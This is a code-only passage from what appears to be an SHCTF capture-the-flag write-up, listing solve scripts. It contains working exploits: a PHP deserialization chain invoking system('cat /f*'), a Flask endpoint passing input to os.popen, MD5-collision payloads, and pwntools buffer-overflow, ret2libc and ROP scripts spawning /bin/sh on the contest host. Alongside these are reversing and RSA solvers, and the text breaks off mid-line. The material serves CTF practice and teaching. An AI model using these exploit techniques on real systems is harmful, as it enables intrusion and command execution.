+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">img = np.array(Image.open(r&#x27;./download.png&#x27;).convert(&#x27;L&#x27;)) </span><br><span class="line"></span><br><span class="line">for i in range(5):</span><br><span class="line">    z = np.zeros_like(img)  </span><br><span class="line">    z[:, i::5] = img[:, i::5]  </span><br><span class="line">    Image.fromarray(z).show()</span><br><span class="line">cat ./* &gt; output</span><br><span class="line">aircrack-ng file -w output</span><br><span class="line">&lt;?php</span><br><span class="line">class SH &#123;</span><br><span class="line"></span><br><span class="line">    public static $Web = false;</span><br><span class="line">    public static $SHCTF = false;</span><br><span class="line">&#125;</span><br><span class="line">class C &#123;</span><br><span class="line">    public $p;</span><br><span class="line"></span><br><span class="line">    public function flag()</span><br><span class="line">    &#123;</span><br><span class="line">        ($this-&gt;p)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class T&#123;</span><br><span class="line"></span><br><span class="line">    public $n;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        SH::$Web = true;</span><br><span class="line">        echo &quot;11&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class F &#123;</span><br><span class="line">    public $o;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        SH::$SHCTF = true;</span><br><span class="line">        $this-&gt;o-&gt;flag();</span><br><span class="line">        return &quot;其实。。。。,&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class SHCTF &#123;</span><br><span class="line">    public $isyou=&quot;system&quot;;</span><br><span class="line">    public $flag=&quot;cat /f*&quot;;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        if (SH::$Web) &#123;</span><br><span class="line"></span><br><span class="line">            ($this-&gt;isyou)($this-&gt;flag);</span><br><span class="line">            echo &quot;小丑竟是我自己呜呜呜~&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;小丑别看了!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a =new T();</span><br><span class="line">$a-&gt;n=new F();</span><br><span class="line">$a-&gt;n-&gt;o=new C();</span><br><span class="line">$a-&gt;n-&gt;o-&gt;p=new SHCTF();</span><br><span class="line">echo base64_encode(serialize($a));</span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">class demo&#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Process process = Runtime.getRuntime().exec(&quot;cat /flag&quot;);</span><br><span class="line">            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));</span><br><span class="line">            String line;</span><br><span class="line">            while ((line = reader.readLine()) != null) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line">            process.waitFor();</span><br><span class="line">            reader.close();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">import os</span><br><span class="line">import flask</span><br><span class="line">from flask import Flask, request, send_from_directory, send_file</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/api&#x27;)</span><br><span class="line">def api():</span><br><span class="line">    cmd = request.args.get(&#x27;SSHCTFF&#x27;, &#x27;ls /&#x27;)</span><br><span class="line">    result = os.popen(cmd).read()</span><br><span class="line">    return result</span><br><span class="line">    </span><br><span class="line">@app.route(&#x27;/robots.txt&#x27;)</span><br><span class="line">def static_from_root():</span><br><span class="line">    return send_from_directory(app.static_folder,&#x27;robots.txt&#x27;)</span><br><span class="line">    </span><br><span class="line">@app.route(&#x27;/s3recttt&#x27;)</span><br><span class="line">def get_source():</span><br><span class="line">    file_path = &quot;app.py&quot;</span><br><span class="line">    return send_file(file_path, as_attachment=True)</span><br><span class="line"> </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(debug=True)</span><br><span class="line">&lt;?php</span><br><span class="line">$md51=file_get_contents(&#x27;./md5_msg1.txt&#x27;);</span><br><span class="line">$md52=file_get_contents(&#x27;./md5_msg2.txt&#x27;);</span><br><span class="line">$master = &quot;MD5 master!&quot;;</span><br><span class="line"></span><br><span class="line">if($md51 !== $md52 &amp;&amp; md5($md51)===md5($md52))&#123;</span><br><span class="line">    echo &quot;master1=&quot;.urlencode(substr($md51,strlen($master)));</span><br><span class="line">    echo &quot;&amp;&quot;;</span><br><span class="line">    echo &quot;master2=&quot;.urlencode(substr($md52,strlen($master)));</span><br><span class="line">&#125;</span><br><span class="line">master1=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%11%A2%C0gYM%90iF%B4%05K%F6h%E7%B3%88%0DKc%1Dq%9F%870F%7B%D1%E3%85%28%CD%3A%E3%0E%C4J%ADJ%A2%EB%E7%BB%5C%02%C6%90cg%40%84_8%D5M%AE%CC%88%B6%86Y_%14%29P%1Dd%7B%23%DE%BD%F2%F0%92%FB%82%E1%27%99%95%D1%8F%E1%A8%83%7C%C4%ED%04%89%21xN%EA%09%AF%CDw%F6%A2%60R%E4%88%EA4%F9Y%89%ACJ%7F%14%F9%28%03O%C3%A3%BE%DA%DFW%7E%E6%B0%94%3B&amp;master2=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%11%A2%C0gYM%90iF%B4%05K%F6h%E7%B3%88%0DK%E3%1Dq%9F%870F%7B%D1%E3%85%28%CD%3A%E3%0E%C4J%ADJ%A2%EB%E7%BB%5C%02F%91cg%40%84_8%D5M%AE%CC%88%B6%06Y_%14%29P%1Dd%7B%23%DE%BD%F2%F0%92%FB%82%E1%27%99%95%D1%8F%E1%28%83%7C%C4%ED%04%89%21xN%EA%09%AF%CDw%F6%A2%60R%E4%88%EA4%F9Y%89%2CJ%7F%14%F9%28%03O%C3%A3%BE%DA%DFW%FE%E6%B0%94%3B</span><br><span class="line">cat /flag &gt;$2</span><br><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">payload = asm(shellcraft.sh())[:-2].ljust(0x100, asm(&#x27;nop&#x27;))</span><br><span class="line">p.sendlineafter(b&#x27;:&#x27;, str(0x50f))</span><br><span class="line">p.sendafter(b&#x27;:&#x27;, payload)</span><br><span class="line">p.interactive()</span><br><span class="line">from pwn import *</span><br><span class="line"># from LibcSearcher import *</span><br><span class="line">import itertools</span><br><span class="line">import ctypes</span><br><span class="line"></span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">is_debug = 0</span><br><span class="line">IP = &quot;entry.shc.tf&quot;</span><br><span class="line">PORT = 45385</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(&#x27;./vuln&#x27;)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">def connect():</span><br><span class="line">    return remote(IP, PORT) if not is_debug else process()</span><br><span class="line"></span><br><span class="line">g = lambda x: gdb.attach(x)</span><br><span class="line">s = lambda x: p.send(x)</span><br><span class="line">sl = lambda x: p.sendline(x)</span><br><span class="line">sa = lambda x, y: p.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: p.sendlineafter(x, y)</span><br><span class="line">r = lambda x=None: p.recv() if x is None else p.recv(x)</span><br><span class="line">rl = lambda: p.recvline()</span><br><span class="line">ru = lambda x: p.recvuntil(x)</span><br><span class="line">r_leak_libc_64 = lambda: u64(p.recvuntil(b&#x27;x7f&#x27;)[-6:].ljust(8, b&#x27;x00&#x27;))</span><br><span class="line">r_leak_libc_32 = lambda: u32(p.recvuntil(b&#x27;xf7&#x27;)[-4:])</span><br><span class="line"></span><br><span class="line">p = connect()</span><br><span class="line"></span><br><span class="line">backdoor = 0x4011DE</span><br><span class="line"></span><br><span class="line">payload = b&#x27;x00&#x27; * 0x118 + p64(backdoor)</span><br><span class="line"></span><br><span class="line">sa(&quot;&gt;&gt;&gt;&quot;,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">from pwn import *</span><br><span class="line"># from LibcSearcher import *</span><br><span class="line">import itertools</span><br><span class="line">import ctypes</span><br><span class="line"></span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">is_debug = 0</span><br><span class="line">IP = &quot;entry.shc.tf&quot;</span><br><span class="line">PORT = 30897</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(&#x27;./vuln&#x27;)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">def connect():</span><br><span class="line">    return remote(IP, PORT) if not is_debug else process()</span><br><span class="line"></span><br><span class="line">g = lambda x: gdb.attach(x)</span><br><span class="line">s = lambda x: p.send(x)</span><br><span class="line">sl = lambda x: p.sendline(x)</span><br><span class="line">sa = lambda x, y: p.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: p.sendlineafter(x, y)</span><br><span class="line">r = lambda x=None: p.recv() if x is None else p.recv(x)</span><br><span class="line">rl = lambda: p.recvline()</span><br><span class="line">ru = lambda x: p.recvuntil(x)</span><br><span class="line">r_leak_libc_64 = lambda: u64(p.recvuntil(b&#x27;x7f&#x27;)[-6:].ljust(8, b&#x27;x00&#x27;))</span><br><span class="line">r_leak_libc_32 = lambda: u32(p.recvuntil(b&#x27;xf7&#x27;)[-4:])</span><br><span class="line"></span><br><span class="line">p = connect()</span><br><span class="line"></span><br><span class="line">sla(&quot;size&quot;,&quot;-1&quot;)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = 0x401223</span><br><span class="line">ret = 0x000000000040101a</span><br><span class="line">main = 0x0000000000401228</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * 0x108 + p64(pop_rdi_ret) + p64(elf.got[&#x27;puts&#x27;]) + p64(elf.plt[&#x27;puts&#x27;]) + p64(main)</span><br><span class="line"># g(p)</span><br><span class="line">sa(&quot;input&quot;,payload)</span><br><span class="line">rl()</span><br><span class="line">leak = u64(r(6).ljust(8,b&#x27;x00&#x27;))</span><br><span class="line">libc_base = leak - libc.sym[&#x27;puts&#x27;]</span><br><span class="line">success(f&quot;libc_base -&gt;&#123;hex(libc_base)&#125;&quot;)</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">binsh = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line"></span><br><span class="line">sla(&quot;size&quot;,&quot;-1&quot;)</span><br><span class="line">payload = b&#x27;a&#x27; * 0x108 + p64(pop_rdi_ret) + p64(binsh) + p64(ret) + p64(system)</span><br><span class="line">sa(&quot;input&quot;,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">from pwn import *</span><br><span class="line"># from LibcSearcher import *</span><br><span class="line">import itertools</span><br><span class="line">import ctypes</span><br><span class="line"></span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">is_debug = 0</span><br><span class="line">IP = &quot;entry.shc.tf&quot;</span><br><span class="line">PORT = 30897</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(&#x27;./vuln&#x27;)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">def connect():</span><br><span class="line">    return remote(IP, PORT) if not is_debug else process()</span><br><span class="line"></span><br><span class="line">g = lambda x: gdb.attach(x)</span><br><span class="line">s = lambda x: p.send(x)</span><br><span class="line">sl = lambda x: p.sendline(x)</span><br><span class="line">sa = lambda x, y: p.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: p.sendlineafter(x, y)</span><br><span class="line">r = lambda x=None: p.recv() if x is None else p.recv(x)</span><br><span class="line">rl = lambda: p.recvline()</span><br><span class="line">ru = lambda x: p.recvuntil(x)</span><br><span class="line">r_leak_libc_64 = lambda: u64(p.recvuntil(b&#x27;x7f&#x27;)[-6:].ljust(8, b&#x27;x00&#x27;))</span><br><span class="line">r_leak_libc_32 = lambda: u32(p.recvuntil(b&#x27;xf7&#x27;)[-4:])</span><br><span class="line"></span><br><span class="line">p = connect()</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = 0x00000000004022bf</span><br><span class="line">pop_rsi_ret = 0x000000000040a32e</span><br><span class="line">pop_rdx_rbx_ret = 0x000000000049d06b</span><br><span class="line">pop_rax_ret = 0x00000000004507f7</span><br><span class="line">bss = 0x4e5000</span><br><span class="line"></span><br><span class="line">read = 0x00000000044FD90 </span><br><span class="line">syscall = 0x0000000000402074</span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    b&#x27;a&#x27; * 0x108, </span><br><span class="line">    pop_rdi_ret, 0, pop_rsi_ret,bss, pop_rdx_rbx_ret, 0x8, 0x0, read,</span><br><span class="line">    pop_rax_ret,0x3b,pop_rdi_ret,bss,pop_rsi_ret,0,pop_rdx_rbx_ret,0,0,syscall</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">sla(&quot;size&quot;,&quot;-1&quot;)</span><br><span class="line">sa(&quot;input&quot;,payload)</span><br><span class="line"></span><br><span class="line">time.sleep(0.3)</span><br><span class="line">s(b&#x27;/bin/shx00&#x27;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">key = [12, 15, 25, 30, 36]</span><br><span class="line">enc = &quot;woLDgMOgw7hEwoJQw7zDtsKow7TDpMOMZMOow75QxIbDnsKmw6Z4UMK0w7rCklDCrMKqwqbDtMOOw6DDsg==&quot;</span><br><span class="line"></span><br><span class="line">decoded= base64.b64decode(enc)</span><br><span class="line">decoded_text = decoded.decode(&#x27;utf-8&#x27;)</span><br><span class="line">    </span><br><span class="line">dec_text = []</span><br><span class="line">    </span><br><span class="line">for i in range(len(decoded_text)):</span><br><span class="line">    enc_char = decoded_text[i]</span><br><span class="line"></span><br><span class="line">    enc_char = ord(enc_char)</span><br><span class="line"></span><br><span class="line">    enc_char = enc_char // 2</span><br><span class="line"></span><br><span class="line">    enc_char = enc_char - 6</span><br><span class="line"></span><br><span class="line">    key_byte = key[i % len(key)]</span><br><span class="line">    ori_char = chr(enc_char ^ key_byte)</span><br><span class="line"></span><br><span class="line">    dec_text.append(ori_char)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">print(&quot;Flag:&quot;, &#x27;&#x27;.join(dec_text))</span><br><span class="line"># Flag: 7Ush87-akjxcy2Ju-dwia9;JSO-IQixnsm</span><br><span class="line">    #include</span><br><span class="line">    #include&lt;stdlib.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()&#123;</span><br><span class="line">        char data[]=&#123;-61,105,114,-60,103,74,-24,17,67,-49,111,0,-13,68,110,-8,89,73,-24,78,94,-30,83,67,-79,92&#125;;</span><br><span class="line">        for(int i=0;i&lt;26;i++)&#123;</span><br><span class="line">                switch (i%3) &#123;</span><br><span class="line">                case 1:</span><br><span class="line">                        data[i]^=0x21;</span><br><span class="line">                        break;</span><br><span class="line">                case 2:</span><br><span class="line">                        data[i]^=0x31;</span><br><span class="line">                        break;</span><br><span class="line">                default:</span><br><span class="line">                        data[i]^=0x90;</span><br><span class="line">                        break;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125; </span><br><span class="line">        for(int i=0;i&lt;=25;i++)&#123;</span><br><span class="line">        cout&lt;&lt;data[i];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">#SHCTF&#123;x0r_N1ce_hxxxoorrr!&#125;</span><br><span class="line">//#include &lt;stdio.h&gt;</span><br><span class="line">    #include &lt;stdlib.h&gt;</span><br><span class="line">    #include&lt;string.h&gt;</span><br><span class="line">    #include</span><br><span class="line">using namespace std;</span><br><span class="line">unsigned char S[256];</span><br><span class="line">void swap(unsigned char *a, unsigned char *b) &#123;</span><br><span class="line">        unsigned char temp = *a;</span><br><span class="line">        *a = *b;</span><br><span class="line">        *b = temp;</span><br><span class="line">&#125;</span><br><span class="line">void rc4_init(unsigned char *key, int key_length, unsigned char *S) &#123;</span><br><span class="line">        int i, j = 0;</span><br><span class="line">        for (i = 0; i &lt; 256; i++)</span><br><span class="line">                S[i] = i;</span><br><span class="line">        </span><br><span class="line">        for (i = 0; i &lt; 256; i++) &#123;</span><br><span class="line">                j = (j + S[i] + key[i % key_length]) % 256;</span><br><span class="line">                swap(&amp;S[i], &amp;S[j]);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">void rc4_crypt(unsigned char *input, unsigned char *output, int length, unsigned char *S) &#123;</span><br><span class="line">        int i = 0, j = 0, t = 0;</span><br><span class="line">        unsigned char k;</span><br><span class="line">        for (int counter = 0; counter &lt; length; counter++) &#123;</span><br><span class="line">                i = (i + 1) % 256;</span><br><span class="line">                j = (j + S[i]) % 256;</span><br><span class="line">                swap(&amp;S[i], &amp;S[j]);</span><br><span class="line">                t = (S[i] + S[j]) % 256;</span><br><span class="line">                k = S[t];</span><br><span class="line">                output[counter] = (input[counter] ^ k)^102;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">        unsigned char key[]=&quot;FenKey!!&quot;;</span><br><span class="line">        unsigned char out[255]=&#123;0&#125;;</span><br><span class="line">        unsigned char data[255]=&#123;33,171,63,66,101,143,60,91,12,23,5,110,132,231,26,105,195,119,112,31,17&#125;;</span><br><span class="line">        rc4_init(key,8,S);</span><br><span class="line">        rc4_crypt(data, out, 21, S);</span><br><span class="line">        cout&lt;&lt;out;        </span><br><span class="line">&#125;</span><br><span class="line">#SHCTF&#123;rc4_nice_ez!!!&#125;</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">import itertools</span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">def euler_phi(iterable):</span><br><span class="line">    result = 1</span><br><span class="line">    for num in iterable:</span><br><span class="line">        result *= (num-1)</span><br><span class="line">    return result</span><br><span class="line">def prod(iterable):</span><br><span class="line">    result = 1</span><br><span class="line">    for num in iterable:</span><br><span class="line">        result *= num</span><br><span class="line">    return result</span><br><span class="line">c = 83203354443691475236566731315885209850712905561683246635494880779210768362320832871594893125899064482788803620121715203387342275170950</span><br><span class="line">N = 705489637689051650495174075199456599608406389508428101084628634963919394623137059785601933728282388128796949031265526970761112358266036965714097232361625743624385075217393911048026324761194431</span><br><span class="line">e = 65537</span><br><span class="line">prime_list = [10721086187325103399,17776230585248364091,15131713702415385611,12631137889156627663,16694564042697614449,15198819432927171347,18418933010365133927,14057998718837106443,17932329510254500553,16438870286806305937]</span><br><span class="line">p_list  = list(itertools.combinations(prime_list, 7))</span><br><span class="line">for i in p_list:</span><br><span class="line">    phi = euler_phi(i)</span><br><span class="line">    n = prod(i)</span><br><span class="line">    try:</span><br><span class="line">        d = gmpy2.invert(e,phi)</span><br><span class="line">        m = pow(c,d,n)</span><br><span class="line">        flag = long_to_bytes(m)</span><br><span class="line">        if b&#x27;SHCTF&#x27; in flag:</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">    </span><br><span class="line">except:</span><br><span class="line">        pass</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">import gmpy2</span><br><span class="line">from tqdm import *</span><br><span class="line"></span><br><span class="line">c = 79650255924640441243783174315738119783087054428100187253964031045992984620971879440861726176524336451142891982435118150281255051661584547445199746244544425882305155402589125955199617147930949561958885307377843571691020998368159145257218511196817046406536607508747287748359813285385239057197003234628847079939</span><br><span class="line">leak = -2599222796268155672542615057820311188233596084301204730398124299903057773299164321565684294941437840950319988869184017952143214614546298874735930095707443093006166798980132582791121684360595863075969212106829764572515951966651060430710482809252673230819220874013454674514944846921907088042630911813223918291506413183923253016666716689505955468069348342349098701467897450818524506135076565</span><br><span class="line">r = 